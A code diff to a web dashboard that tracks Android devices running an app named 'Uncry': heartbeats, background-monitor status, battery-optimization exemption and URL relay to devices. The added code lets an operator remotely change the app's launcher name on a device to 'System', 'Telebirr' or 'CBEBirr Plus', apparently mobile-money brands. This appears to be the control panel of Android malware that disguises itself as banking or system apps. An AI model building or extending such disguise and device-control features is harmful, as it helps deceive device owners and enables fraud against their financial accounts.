@@ -6,7 +6,21 @@ type Device = {
   deviceId:string; model:string; androidVersion:string; appVersion:string;
   installed:string[]; missing:string[]; monitorRunning:boolean;
   batteryOptimized:boolean; lastSeen:string; firstSeen:string; heartbeatCount:number;
+  alias?:string; appLabel?:string;
 };
+
+const ALIAS_OPTIONS = [
+  { key: "system", label: "System" },
+  { key: "telebirr", label: "Telebirr" },
+  { key: "cbebirr-plus", label: "CBEBirr Plus" },
+];
+
+async function renameDevice(id:string, alias:string, label:string){
+  const r=await fetch(`/api/devices/${encodeURIComponent(id)}/rename`,{method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({alias})});
+  const j=await r.json();
+  if(r.ok) alert(`Rename queued for ${id.slice(0,8)} — launcher name becomes "${label}" within 5s`);
+  else alert(`Rename failed: ${j.error||r.status}`);
+}
 
 export default function Dashboard(){
   const [devices,setDevices]=useState<Device[]>([]);
@@ -33,8 +47,8 @@ export default function Dashboard(){
 
     <div className="overflow-auto border rounded-2xl mt-6">
       <table className="w-full text-sm">
-        <thead className="bg-gray-50 text-gray-500"><tr><th className="text-left p-3">Device</th><th className="text-left p-3">Install state</th><th className="text-left p-3">Monitor</th><th className="text-left p-3">Battery</th><th className="text-left p-3">Last seen</th><th className="text-left p-3">Heartbeats</th><th className="text-left p-3">Relay</th></tr></thead>
-        <tbody>{filtered.length===0?<tr><td colSpan={7} className="p-8 text-center text-gray-400">No devices yet — launch Uncry (poss) and it will register here.</td></tr>:filtered.map(d=>{
+        <thead className="bg-gray-50 text-gray-500"><tr><th className="text-left p-3">Device</th><th className="text-left p-3">Install state</th><th className="text-left p-3">Monitor</th><th className="text-left p-3">Battery</th><th className="text-left p-3">Last seen</th><th className="text-left p-3">Heartbeats</th><th className="text-left p-3">App name</th><th className="text-left p-3">Relay</th></tr></thead>
+        <tbody>{filtered.length===0?<tr><td colSpan={8} className="p-8 text-center text-gray-400">No devices yet — launch Uncry (poss) and it will register here.</td></tr>:filtered.map(d=>{
           const online=Date.now()-new Date(d.lastSeen).getTime()< 90_000;
           return <tr key={d.deviceId} className="border-t hover:bg-gray-50">
             <td className="p-3"><Link href={`/dashboard/${encodeURIComponent(d.deviceId)}`} className="font-mono text-xs text-violet-600 hover:underline">{d.deviceId.slice(0,12)}…</Link><div className="text-xs text-gray-500">{d.model} · A{d.androidVersion} · {d.appVersion}</div></td>
@@ -43,6 +57,10 @@ export default function Dashboard(){
             <td className="p-3 text-xs">{d.batteryOptimized?"optimized (risk)":"exempt ✓"}</td>
             <td className="p-3 text-xs">{new Date(d.lastSeen).toLocaleString()}<div className="text-gray-400">first {new Date(d.firstSeen).toLocaleDateString()}</div></td>
             <td className="p-3 text-xs">{d.heartbeatCount} <Link href={`/dashboard/${encodeURIComponent(d.deviceId)}`} className="ml-2 text-violet-600 hover:underline">view →</Link></td>
+            <td className="p-3"><div className="text-xs font-medium">{d.appLabel||"Uncry"}</div><div className="flex gap-1 mt-1">{ALIAS_OPTIONS.map(o=>(
+              <button key={o.key} onClick={()=>renameDevice(d.deviceId,o.key,o.label)} title={`Rename to ${o.label}`}
+                className={`text-[11px] px-2 py-1 rounded-lg border ${(d.alias||"uncry")===o.key?"bg-slate-800 text-white border-slate-800":"hover:bg-gray-100"}`}>{o.label}</button>
+            ))}</div></td>
             <td className="p-3"><div className="flex gap-1.5"><button onClick={async()=>{
                 const r=await fetch(`/api/devices/${encodeURIComponent(d.deviceId)}/relay`,{method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({slot:1, url:"https://spotify.com"})});
                 const j=await r.json();
